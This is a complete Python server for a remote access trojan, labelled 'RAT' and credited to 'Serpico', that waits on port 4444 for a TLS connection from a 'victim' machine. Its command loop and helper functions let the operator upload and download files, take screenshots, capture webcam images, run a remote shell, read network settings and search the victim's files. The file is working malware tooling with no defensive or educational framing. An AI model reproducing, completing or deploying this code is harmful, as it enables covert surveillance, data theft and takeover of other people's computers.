# --------------- IMPORT ---------------
import socket,os,ssl
from datetime import datetime

# --------------- SERVER CONNECTION ---------------

IP= '0.0.0.0'
PORT= 4444

def rat_server():
    tls=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    tls.load_cert_chain(certfile="./ssl/cert.pem",keyfile="./ssl/key.pem")
    server= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((IP,PORT))
    server.listen(1) 
    print("""
#####      ##     ######
##  ##    ####      ##
##  ##   ##  ##     ##
#####    ######     ##
####     ##  ##     ##
## ##    ##  ##     ##
##  ##   ##  ##     ##
                By Serpico
          
""")
    print(f">> Waiting for connection on port {PORT} <<")

    client, address= server.accept()
    victim= tls.wrap_socket(client,server_side=True)
    print(f">> Someone is connected ({address[0]}) <<")

# --------------- COMMANDS ---------------
    while True:
        command = input("|RAT|> ")

        if command== '':
            continue

        elif command.startswith("upload"):
            victim.send(command.encode())
            upload(victim, command.split(" ", 1)[1])

        elif command.startswith("download"):
            victim.send(command.encode())
            download(victim, command.split(" ", 1)[1])

        elif command== 'screenshot':
            victim.send(b'screenshot')
            screenshot(victim)

        elif command == 'shell':
            victim.send(b'shell')
            shell(victim)

        elif command == 'ipconfig':
            victim.send(b'ipconfig')
            network_conf= victim.recv(4096).decode()
            print(network_conf)

        elif command.startswith("search"):
            victim.send(command.encode())
            searched_file = victim.recv(4096).decode()
            print(searched_file)

        elif command=='webcam':
            victim.send(b'webcam')
            webcam(victim)

        elif command=='exit':
            victim.send(b'exit')
            break

        elif command== 'help':
            print("""
    Available commands:
      upload <file_path>    - Send a file to the victim computer
      download <file_path>  - Download a file from the victim computer
      screenshot            - Take a screenshot from the victim computer
      shell                 - Activate shell mode to execute commands on the victim computer
      ipconfig              - Display the victim's computer network configuration
      search <file_path>    - Search for files on the victim computer
      webcam                - Capture an image from the victim's webcam
      exit                  - Exit the server
      help                  - Display commands
    """)
        else:
            print(">> Unknown command - Type help to see commands <<")

    victim.close()
    server.close()



# --------------- FUNCTIONS ---------------

# Download file from the victim computer
def download(victim,file_path):
    file_name = os.path.basename(file_path)
    file= os.path.join("download", file_name)
    size= int.from_bytes(victim.recv(4), 'big')
    if size == 0:
        print(f">> File : {file_path} not found <<")
        return

    with open(file,'wb') as f:
        while size > 0:
            bytes= victim.recv(min(4096, size))
            f.write(bytes)
            size-= len(bytes)
    print(f">> File : {file} has been received <<")

# Upload file to the victim computer
def upload(victim,file_path):
    with open(file_path, 'rb') as f:
        while chunk:= f.read(4096):
            victim.send(chunk)
    victim.send(b'DONE')

    print(f">> File : {file_path} has been sent <<")

# Take a screenshot from the victim computer
def screenshot(victim):
    time_file= datetime.now().strftime('%d%m%Y_%H%M%S')
    file_name= os.path.join('screenshot',f'screenshot_{time_file}.png')
    image_size= int.from_bytes(victim.recv(4),'big')
    with open(file_name, 'wb') as f:
        while image_size > 0:
            bytes_read= victim.recv(min(4096, image_size))
            if bytes_read == b'':
                break
            f.write(bytes_read)
            image_size-= len(bytes_read)

    print(f">> Screenshot : {file_name} has been received <<")

# Shell mode to execute commands on the victim computer
def shell(victim):
    print(">> Shell mode activated, 'exit' to quit <<")
    while True:
        command= input("|shell|> ")
        if command== 'exit':
            victim.send(b'exit_shell')
            break
        if command.strip()== '':
            continue
        victim.send(command.encode())
        response= victim.recv(4096).decode()
        print(response)

# Capture an image from the victim's webcam
def webcam(victim):
    timestamp= datetime.now().strftime('%d%m%Y_%H%M%S')
    file_name= os.path.join('webcam', f'webcam_{timestamp}.png')
    image_size=int.from_bytes(victim.recv(4), 'big')
    with open(file_name,'wb') as f:
        while image_size > 0:
            bytes_read= victim.recv(min(4096, image_size))
            if bytes_read == b'':
                break
            f.write(bytes_read)
            image_size-=len(bytes_read)
    print(f">> Webcam : {file_name} has been received <<")


# --------------- MAIN ---------------

if __name__ == "__main__":
    rat_server()
